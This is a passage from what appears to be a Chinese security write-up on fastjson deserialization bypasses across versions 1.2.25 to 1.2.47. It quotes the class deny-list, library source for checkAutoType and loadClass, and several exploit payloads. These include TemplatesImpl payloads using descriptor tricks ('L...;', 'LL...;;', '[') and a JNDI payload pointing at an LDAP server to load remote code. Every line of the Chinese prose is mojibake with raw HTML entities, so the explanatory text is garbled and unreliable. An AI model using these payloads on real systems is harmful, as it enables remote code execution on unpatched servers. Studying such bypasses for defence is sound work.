é»‘åå•çš„æ¥å£ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.41 æè¿°ï¼šä½œè€…é€šè¿‡ä¸ºå±é™©åŠŸèƒ½æ·»åŠ å¼€å…³ï¼Œå¹¶æä¾›é»‘ç™½åå•ä¸¤ç§æ–¹å¼è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œå…¶å®å·²ç»æ˜¯ç›¸å½“å®Œæ•´çš„é˜²æŠ¤æ€è·¯ï¼Œè€Œä¸”ä½œè€…å·²ç»æ„è¯†åˆ°é»‘åå•ç±»å°†ä¼šæ— ç©·æ— å°½ï¼Œä»…ä»…é€šè¿‡ç»´æŠ¤åˆ—è¡¨æ¥é˜²æ­¢ååºåˆ—åŒ–æ¼æ´å¹¶éæœ€å¥½çš„åŠæ³•ã€‚è€Œä¸”é ç”¨æˆ·è‡ªå·±æ¥å…³æ³¨å®‰å…¨ä¿¡æ¯å»ç»´æŠ¤ä¹Ÿä¸ç°å®ã€‚\nå®‰å…¨æ›´æ–°ä¸»è¦é›†ä¸­åœ¨ com.alibaba.fastjson.parser.ParserConfigï¼Œé¦–å…ˆæŸ¥çœ‹ç±»ä¸Šå‡ºç°äº†å‡ ä¸ªæˆå‘˜å˜é‡ï¼šå¸ƒå°”å‹çš„ autoTypeSupportï¼Œç”¨æ¥æ ‡è¯†æ˜¯å¦å¼€å¯ä»»æ„ç±»å‹çš„ååºåˆ—åŒ–ï¼Œå¹¶ä¸”é»˜è®¤å…³é—­ï¼›å­—ç¬¦ä¸²æ•°ç»„ denyList ï¼Œæ˜¯ååºåˆ—åŒ–ç±»çš„é»‘åå•ï¼›acceptList æ˜¯ååºåˆ—åŒ–ç™½åå•ã€‚\nå…¶ä¸­é»‘åå• denyList åŒ…æ‹¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework æ·»åŠ ååºåˆ—åŒ–ç™½åå•æœ‰3ç§æ–¹æ³•ï¼š\nä½¿ç”¨ä»£ç è¿›è¡Œæ·»åŠ ï¼šParserConfig.getGlobalInstance().addAccept(â€œorg.reus09.fastjson.,org.javaweb.â€) åŠ ä¸ŠJVMå¯åŠ¨å‚æ•°ï¼š-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson. åœ¨fastjson.propertiesä¸­æ·»åŠ ï¼šfastjson.parser.autoTypeAccept=org.reus09.fastjson. ç„¶åæˆ‘ä»¬åˆ†æä¸€ä¸‹1.2.25ç‰ˆæœ¬ä¸‹çš„checkæœºåˆ¶\né¦–å…ˆå¼€å¯autoTypeSupport,å…ˆæ ¹æ®ç™½åå•è¿›è¡Œåˆ¤åˆ«ï¼Œå†é€šè¿‡é»‘åå•è¿›è¡Œåˆ¤åˆ«ã€‚å¦‚æœåœ¨ï¼Œå°±ä½¿ç”¨ TypeUtils.loadClass åŠ è½½ï¼Œç„¶åä½¿ç”¨é»‘åå•åˆ¤æ–­ç±»åçš„å¼€å¤´ï¼Œå¦‚æœåŒ¹é…å°±æŠ›å‡ºå¼‚å¸¸ã€‚\nå¦‚æœä¸Šé¢æ²¡æŸ¥è¯¢åˆ°ï¼Œé€šè¿‡TypeUtils.getClassFromMapping(typeName)ç¼“å­˜åˆ¤æ–­\nç¼“å­˜é‡Œé¢çš„ç§ç±»å¦‚ä¸‹ï¼š\nç¼“å­˜ä¹Ÿæ²¡æœ‰ï¼Œåœ¨æ²¡æœ‰å¼€å¯autoTypeSupportçš„æ—¶å€™ï¼Œå…ˆè¿›å…¥é»‘åå•è¿›è¡Œåˆ¤æ–­ï¼Œç„¶ååœ¨ç™½åå•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨ç™½åå•ï¼ŒåŒæ ·è¿›è¡ŒloadlClassåŠ è½½ã€‚\næœ€åï¼Œå¦‚æœå®ƒæ˜¯ä¸ªæœŸæœ›ç±»ï¼Œå¹¶ä¸”åœ¨é»‘ç™½åå•éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼ŒåŒæ ·è°ƒç”¨loadClassã€‚\næˆ‘ä»¬é€šè¿‡åˆ†æloadClassæ–¹æ³•çš„é€»è¾‘ï¼Œè¿™ä¸ªç±»åœ¨åŠ è½½ç›®æ ‡ç±»ä¹‹å‰ä¸ºäº†å…¼å®¹å¸¦æœ‰æè¿°ç¬¦çš„ç±»åï¼Œä½¿ç”¨äº†é€’å½’è°ƒç”¨æ¥å¤„ç†æè¿°ç¬¦ä¸­çš„ [ã€Lã€; å­—ç¬¦ã€‚\nåœ¨è¿™ä¸ªä½ç½®å‡ºç°äº†é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¸¦æœ‰æè¿°ç¬¦çš„ç±»ç»•è¿‡é»‘åå•çš„é™åˆ¶ï¼Œè€Œåœ¨ç±»åŠ è½½è¿‡ç¨‹ä¸­ï¼Œæè¿°ç¬¦è¿˜ä¼šè¢«å¤„ç†æ‰ã€‚å› æ­¤ï¼Œæ¼æ´åˆ©ç”¨çš„æ€è·¯å°±å‡ºæ¥äº†ï¼šéœ€è¦å¼€å¯ autoTypeï¼Œä½¿ç”¨ä»¥ä¸Šå­—ç¬¦æ¥è¿›è¡Œé»‘åå•çš„ç»•è¿‡ã€‚\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.42 åœ¨ç‰ˆæœ¬ 1.2.42 ä¸­ï¼Œfastjson ç»§ç»­å»¶ç»­äº†é»‘ç™½åå•çš„æ£€æµ‹æ¨¡å¼ï¼Œä½†æ˜¯å°†é»‘åå•ç±»ä»ç™½åå•ä¿®æ”¹ä¸ºä½¿ç”¨ HASH çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶äººå‘˜æ ¹æ®é»‘åå•ä¸­çš„ç±»è¿›è¡Œåå‘ç ”ç©¶ï¼Œç”¨æ¥å¯¹æœªæ›´æ–°çš„å†å²ç‰ˆæœ¬è¿›è¡Œæ”»å‡»ã€‚åŒæ—¶ï¼Œä½œè€…å¯¹ä¹‹å‰ç‰ˆæœ¬ä¸€ç›´å­˜åœ¨çš„ä½¿ç”¨ç±»æè¿°ç¬¦ç»•è¿‡é»‘åå•æ ¡éªŒçš„é—®é¢˜å°è¯•è¿›è¡Œäº†ä¿®å¤ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.42 æè¿°ï¼šé€šè¿‡å˜é‡å¸¸ç”¨çš„jarã€ç±»ã€å­—ç¬¦ä¸²ç¢°æ’hashå¾—åˆ°é»‘åå•\nè¿˜æ˜¯å…³æ³¨ com.alibaba.fastjson.parser.ParserConfig è¿™ä¸ªç±»ï¼Œä½œè€…å°†åŸæœ¬çš„æ˜æ–‡é»‘åå•è½¬ä¸ºä½¿ç”¨äº† Hash é»‘åå•ï¼Œé˜²æ­¢å®‰å…¨äººå‘˜å¯¹å…¶ç ”ç©¶ã€‚\nåŠ å¯†æ–¹å¼åœ¨com.alibaba.fastjson.util.TypeUtils#fnv1a_64æ˜¯æœ‰çš„\nå¹¶ä¸”åœ¨ checkAutoType ä¸­åŠ å…¥åˆ¤æ–­ï¼Œå¦‚æœç±»çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ L ç»“å°¾æ˜¯ ;ï¼Œåˆ™ä½¿ç”¨ substring è¿›è¡Œäº†å»é™¤ã€‚è¿˜æ˜¯ç”¨hashå†™çš„ã€‚\nä½†æ˜¯è¿™ç§åˆ¤æ–­å®Œå…¨æ˜¯å¾’åŠ³çš„ï¼Œå› ä¸ºåœ¨æœ€åloadClasså¤„ç†æ—¶æ˜¯é€’å½’å¤„ç†ï¼Œå› æ­¤åªè¦å¯¹æè¿°ç¬¦è¿›è¡ŒåŒå†™å³å¯ç»•è¿‡ï¼š\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.43 è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­åŒå†™ç»•è¿‡çš„é—®é¢˜ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.43 æè¿°ï¼šä¸Šæœ‰æ”¿ç­–ï¼Œä¸‹æœ‰å¯¹ç­–ã€‚åœ¨ Lã€; è¢«è¿›è¡Œäº†é™åˆ¶åï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å°†ç›®å…‰è½¬å‘äº† [ã€‚\nå¯ä»¥çœ‹åˆ°ç”¨æ¥æ£€æŸ¥çš„ checkAutoType ä»£ç æ·»åŠ äº†åˆ¤æ–­ï¼Œå¦‚æœç±»åè¿ç»­å‡ºç°äº†ä¸¤ä¸ª L å°†ä¼šæŠ›å‡ºå¼‚å¸¸\nè¿™æ ·ä½¿ç”¨ Lã€; ç»•è¿‡é»‘åå•çš„æ€è·¯å°±è¢«é˜»æŒ¡äº†ï¼Œä½†æ˜¯åœ¨ loadClass çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜é’ˆå¯¹ [ ä¹Ÿè¿›è¡Œäº†å¤„ç†å’Œé€’å½’.\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;[, {\u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.44 è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­ä½¿ç”¨ [ ç»•è¿‡é»‘åå•é˜²æŠ¤çš„é—®é¢˜ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.44 æè¿°ï¼šåœ¨æ­¤ç‰ˆæœ¬å°† [ ä¹Ÿè¿›è¡Œä¿®å¤äº†ä¹‹åï¼Œç”±å­—ç¬¦ä¸²å¤„ç†å¯¼è‡´çš„é»‘åå•ç»•è¿‡ä¹Ÿå°±å‘Šä¸€æ®µè½äº†ã€‚\nåœ¨ checkAutoType ä¸­æ·»åŠ äº†æ–°çš„åˆ¤æ–­ï¼Œå¦‚æœç±»åä»¥ [ å¼€å§‹åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚\nå¯ä»¥ä½¿ç”¨åƒfastjson-1.2.45çš„payload byPass\nfastjson-1.2.45 åœ¨æ­¤ç‰ˆæœ¬çˆ†å‡ºäº†ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œå®é™…ä¸Šï¼Œé»‘åå•æ˜¯æ— ç©·æ— å°½çš„ï¼Œéšç€ fastjson çš„ç‰ˆæœ¬æ›´æ–°ï¼Œä¸€å®šä¼šæœ‰æ›´å¤šçš„é»‘åå•çˆ†å‡ºæ¥ï¼Œå› ä¸ºéš”å£ jackson éƒ½æ˜¯æ˜æ–‡é»‘åå•çš„ï¼Œåªè¦éš”å£ä¸€æ›´æ–°ï¼Œå¤§å®¶éƒ½çœ‹åˆ°äº†ï¼Œå°±ä¼šæ‹¿æ¥çœ‹ fastjsonã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45 æè¿°ï¼šé»‘åå•åˆ—è¡¨éœ€è¦ä¸æ–­è¡¥å……ã€‚\npayloadå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 { \u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;, \u0026#34;properties\u0026#34;:{ \u0026#34;data_source\u0026#34;:\u0026#34;ldap://127.0.0.1:23457/Command8\u0026#34; } } éœ€è¦pom\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.ibatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;ibatis-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; fastjson-1.2.47 åœ¨ fastjson ä¸æ–­è¿­ä»£åˆ° 1.2.47 æ—¶ï¼Œçˆ†å‡ºäº†æœ€ä¸ºä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸å¼€å¯ AutoTypeSupport çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–çš„åˆ©ç”¨ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.32 æœªå¼€å¯ AutoTypeSupport å½±å“ç‰ˆæœ¬ï¼š1.2.33 \u0026lt;= fastjson \u0026lt;= 1.2.47ä¸è®ºæ˜¯å¦å¼€å¯AutoTypeSupport æè¿°ï¼šä½œè€…åˆ é™¤äº†ä¸€ä¸ª fastjson çš„æµ‹è¯•æ–‡ä»¶ï¼šhttps://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ï¼Œé‡Œé¢åŒ…å«äº†è¿™æ¬¡é€šæ€æ¼æ´çš„ payloadã€‚\nåˆ†æ è¿™æ¬¡çš„ç»•è¿‡é—®é¢˜è¿˜æ˜¯å‡ºç°åœ¨ checkAutoType() æ–¹æ³•ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 public Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { // ç±»åéç©ºåˆ¤æ–­ if (typeName == null) { return null; } // ç±»åé•¿åº¦åˆ¤æ–­ï¼Œä¸å¤§äº128ä¸å°äº3 if (typeName.length() \u0026gt;= 128 || typeName.length() \u0026lt; 3) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } String className = typeName.replace(\u0026#39;$\u0026#39;, \u0026#39;.\u0026#39;); Class\u0026lt;?\u0026gt; clazz = null; final long BASIC = 0xcbf29ce484222325L; //; final long PRIME = 0x100000001b3L; //L final long h1 = (BASIC ^ className.charAt(0)) * PRIME; // ç±»åä»¥ [ å¼€å¤´æŠ›å‡ºå¼‚å¸¸ if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } // ç±»åä»¥ L å¼€å¤´ä»¥ ; ç»“å°¾æŠ›å‡ºå¼‚å¸¸ if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; // autoTypeSupport ä¸º true æ—¶ï¼Œå…ˆå¯¹æ¯” acceptHashCodes åŠ è½½ç™½åå•é¡¹ if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u0026lt; className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u0026gt;= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } // åœ¨å¯¹æ¯” denyHashCodes è¿›è¡Œé»‘åå•åŒ¹é… // å¦‚æœé»‘åå•æœ‰åŒ¹é…å¹¶ä¸” TypeUtils.mappings é‡Œæ²¡æœ‰ç¼“å­˜è¿™ä¸ªç±» // åˆ™æŠ›å‡ºå¼‚å¸¸ if (Arrays.binarySearch(denyHashCodes, hash) \u0026gt;= 0 \u0026amp;\u0026amp; TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } } } // å°è¯•åœ¨ TypeUtils.mappings ä¸­æŸ¥æ‰¾ç¼“å­˜çš„ class if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName); } // å°è¯•åœ¨ deserializers ä¸­æŸ¥æ‰¾è¿™ä¸ªç±» if (clazz == null) { clazz = deserializers.findClass(typeName); } // å¦‚æœæ‰¾åˆ°äº†å¯¹åº”çš„ classï¼Œåˆ™ä¼šè¿›è¡Œ return if (clazz != null) { if (expectClass != null \u0026amp;\u0026amp; clazz != java.util.HashMap.class \u0026amp;\u0026amp; !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } return clazz; } // å¦‚æœæ²¡æœ‰å¼€å¯ AutoTypeSupport ï¼Œåˆ™å…ˆåŒ¹é…é»‘åå•ï¼Œåœ¨åŒ¹é…ç™½åå•ï¼Œä¸ä¹‹å‰é€»è¾‘ä¸€è‡´ if (!autoTypeSupport) { long hash = h3; for (int i = 3; i \u0026lt; className.length(); ++i) { char c = className.charAt(i); hash ^= c; hash *= PRIME; if (Arrays.binarySearch(denyHashCodes, hash) \u0026gt;= 0) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } if (Arrays.binarySearch(acceptHashCodes, hash) \u0026gt;= 0) { if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (expectClass != null \u0026amp;\u0026amp; expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } return clazz; } } } // å¦‚æœ class è¿˜ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨ TypeUtils.loadClass å°è¯•åŠ è½½è¿™ä¸ªç±» if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } else { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } } JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null \u0026amp;\u0026amp; autoTypeSupport) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } } final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026amp; mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026amp; mask) != 0; if (!autoTypeSupport) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } return clazz; } ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼šautoTypeSupport ä¸º true æ—¶ï¼Œfastjson ä¼šç¦æ­¢ä¸€äº›é»‘åå•çš„ç±»ååºåˆ—åŒ–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶ï¼šå½“ååºåˆ—åŒ–çš„ç±»åœ¨é»‘åå•ä¸­ï¼Œä¸” TypeUtils.mappings ä¸­æ²¡æœ‰è¯¥ç±»çš„ç¼“å­˜æ—¶ï¼Œæ‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œå°±ç•™ä¸‹äº†ä¸€ä¸ªä¼ç¬”ã€‚å°±æ˜¯è¿™ä¸ªé€»è¾‘å¯¼è‡´äº† 1.2.32 ä¹‹å‰çš„ç‰ˆæœ¬å°†ä¼šå—åˆ° autoTypeSupport çš„å½±å“ã€‚\nåœ¨ autoTypeSupport ä¸ºé»˜è®¤çš„ false æ—¶ï¼Œç¨‹åºç›´æ¥æ£€æŸ¥é»‘åå•å¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œåœ¨è¿™éƒ¨åˆ†æˆ‘ä»¬æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å…³æ³¨ç‚¹å°±åœ¨åˆ¤æ–­ä¹‹å‰ï¼Œç¨‹åºæœ‰åœ¨ TypeUtils.mappings ä¸­å’Œ deserializers ä¸­å°è¯•æŸ¥æ‰¾è¦ååºåˆ—åŒ–çš„ç±»ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™å°±ä¼š returnï¼Œè¿™å°±é¿å¼€ä¸‹é¢ autoTypeSupport é»˜è®¤ä¸º false æ—¶çš„æ£€æŸ¥ã€‚å¦‚ä½•æ‰èƒ½åœ¨è¿™ä¸¤æ­¥ä¸­å°†æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½è¿›å»å‘¢ï¼Ÿ\nå…ˆçœ‹ deserializers ï¼Œä½äº com.alibaba.fastjson.parser.ParserConfig.deserializers ï¼Œæ˜¯ä¸€ä¸ª IdentityHashMapï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š\ngetDeserializer()ï¼šè¿™ä¸ªç±»ç”¨æ¥åŠ è½½ä¸€äº›ç‰¹å®šç±»ï¼Œä»¥åŠæœ‰ JSONType æ³¨è§£çš„ç±»ï¼Œåœ¨ put ä¹‹å‰éƒ½æœ‰ç±»ååŠç›¸å…³ä¿¡æ¯çš„åˆ¤æ–­ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚ initDeserializers()ï¼šæ— å…¥å‚ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­è°ƒç”¨ï¼Œå†™æ­»ä¸€äº›è®¤ä¸ºæ²¡æœ‰å±å®³çš„å›ºå®šå¸¸ç”¨ç±»ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚ putDeserializer()ï¼šè¢«å‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨ï¼Œæˆ‘ä»¬æ— æ³•æ§åˆ¶å…¥å‚ã€‚ å› æ­¤æˆ‘ä»¬æ— æ³•å‘ deserializers ä¸­å†™å…¥å€¼ï¼Œä¹Ÿå°±åœ¨å…¶ä¸­è¯»å‡ºæˆ‘ä»¬æƒ³è¦çš„æ¶æ„ç±»ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®å…‰è½¬å‘äº† TypeUtils.getClassFromMapping(typeName)ã€‚\nåŒæ ·çš„ï¼Œè¿™ä¸ªæ–¹æ³•ä» TypeUtils.mappings ä¸­å–å€¼ï¼Œè¿™æ˜¯ä¸€ä¸ª ConcurrentHashMap å¯¹è±¡ï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š\naddBaseClassMappings()ï¼šæ— å…¥å‚ï¼ŒåŠ è½½ loadClass()ï¼šå…³é”®å‡½æ•° æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ loadClass() çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 public static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) { // éç©ºåˆ¤æ–­ if(className == null || className.length() == 0){ return null; } // é˜²æ­¢é‡å¤æ·»åŠ  Class\u0026lt;?\u0026gt; clazz = mappings.get(className); if(clazz != null){ return clazz; } // åˆ¤æ–­ className æ˜¯å¦ä»¥ [ å¼€å¤´ if(className.charAt(0) == \u0026#39;[\u0026#39;){ Class\u0026lt;?\u0026gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } // åˆ¤æ–­ className æ˜¯å¦ L å¼€å¤´ ; ç»“å°¾ if(className.startsWith(\u0026#34;L\u0026#34;) \u0026amp;\u0026amp; className.endsWith(\u0026#34;;\u0026#34;)){ String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } try{ // å¦‚æœ classLoader éç©ºï¼Œcache ä¸º true åˆ™ä½¿ç”¨è¯¥ç±»åŠ è½½å™¨åŠ è½½å¹¶å­˜å…¥ mappings ä¸­ if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } // å¦‚æœå¤±è´¥ï¼Œæˆ–æ²¡æœ‰æŒ‡å®š ClassLoader ï¼Œåˆ™ä½¿ç”¨å½“å‰çº¿ç¨‹çš„ contextClassLoader æ¥åŠ è½½ç±»ï¼Œä¹Ÿéœ€è¦ cache ä¸º true æ‰èƒ½å†™å…¥ mappings ä¸­ try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026amp;\u0026amp; contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } // å¦‚æœè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™ä½¿ç”¨ Class.forName æ¥è·å– class å¯¹è±¡å¹¶æ”¾å…¥ mappings ä¸­ try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ï¼Œå°±å¯ä»¥å¾€ mappings ä¸­å†™å…¥ä»»æ„ç±»åã€‚ loadClass ä¸€å…±æœ‰ä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š\næˆ‘ä»¬éœ€è¦æ‰¾åˆ°è°ƒç”¨è¿™äº›æ–¹æ³•çš„ç±»ï¼Œå¹¶çœ‹æ˜¯å¦èƒ½å¤Ÿä¸ºæˆ‘ä»¬æ§åˆ¶ï¼š\nClass\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache)ï¼šè°ƒç”¨é“¾å‡åœ¨ checkAutoType() å’Œ TypeUtils é‡Œè‡ªè°ƒç”¨ï¼Œç•¥è¿‡ã€‚ Class\u0026lt;?\u0026gt; loadClass(String className)ï¼šé™¤äº†è‡ªè°ƒç”¨ï¼Œæœ‰ä¸€ä¸ª castToJavaBean() æ–¹æ³•ï¼Œæš‚æœªç ”ç©¶ã€‚ Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader)ï¼šæ–¹æ³•è°ƒç”¨ä¸‰ä¸ªå‚æ•°çš„é‡è½½æ–¹æ³•ï¼Œå¹¶æ·»åŠ å‚æ•° true ï¼Œä¹Ÿå°±æ˜¯ä¼šåŠ å…¥å‚æ•°ç¼“å­˜ä¸­ã€‚ é‡ç‚¹çœ‹ä¸€ä¸‹ä¸¤ä¸ªå‚æ•°çš„ loadClass æ–¹æ³•åœ¨å“ªè°ƒç”¨ï¼š\nåœ¨è¿™é‡Œæˆ‘ä»¬å…³æ³¨ com.alibaba.fastjson.serializer.MiscCodec#deserialze æ–¹æ³•ï¼Œè¿™ä¸ªç±»æ˜¯ç”¨æ¥å¤„ç†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿç±»çš„ååºåˆ—åŒ–ç±»ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ Class.class ç±»ï¼Œæˆä¸ºäº†æˆ‘ä»¬çš„å…¥å£ã€‚\nå¦‚æœ parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œè¿›å…¥ if è¯­å¥ï¼Œä¼šè§£æ val ä¸­çš„å†…å®¹å¹¶æ”¾å…¥ objVal 